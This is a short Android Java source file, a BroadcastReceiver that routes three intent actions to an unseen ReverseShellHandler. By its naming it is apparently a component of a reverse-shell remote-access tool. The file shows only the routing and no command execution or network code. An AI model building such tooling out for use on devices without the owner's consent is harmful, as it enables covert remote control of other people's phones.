package com.example.reverseshell;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class ReverseShellReceiver extends BroadcastReceiver {
    public static final String InShellAction = "reverseshell.intent.action.IN";
    public static final String OutShellAction = "reverseshell.intent.action.OUT";
    public static final String ShellAction = "reverseshell.intent.action.SHELL";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        switch (intent.getAction()) {
            case InShellAction:
                ReverseShellHandler.handleInShell(context, intent);
                break;
            case OutShellAction:
                ReverseShellHandler.handleOutShell(context, intent);
                break;
            case ShellAction:
                ReverseShellHandler.handleShell(context, intent);
                break;
        }
    }
}
